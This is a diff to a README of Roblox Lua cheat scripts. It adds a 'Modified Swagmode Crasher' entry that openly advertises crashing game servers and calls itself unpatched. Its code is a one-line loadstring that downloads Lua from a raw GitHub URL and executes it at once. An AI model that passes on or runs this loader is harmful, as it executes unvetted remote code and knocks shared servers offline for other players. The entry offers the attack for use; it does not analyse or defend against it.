@@ -2,6 +2,14 @@
 
 ## Loadstrings
 
+**Modified Swagmode Crasher** <br />
+*Lets you Crash the Server using Swagcrash - This Modification is boosting your FPS so the Server will Crash faster* <br />
+*If the Swagcrash GUI opens instantly press Start Crash*<br />
+*Unpatched* <br />
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chiiicken5538/lua-scripts/main/modified_swagcrash"))()
+```
+
 **AntiAFK** <br />
 *Prevents Idle-Kicks* <br />
 *Unpatched* <br />
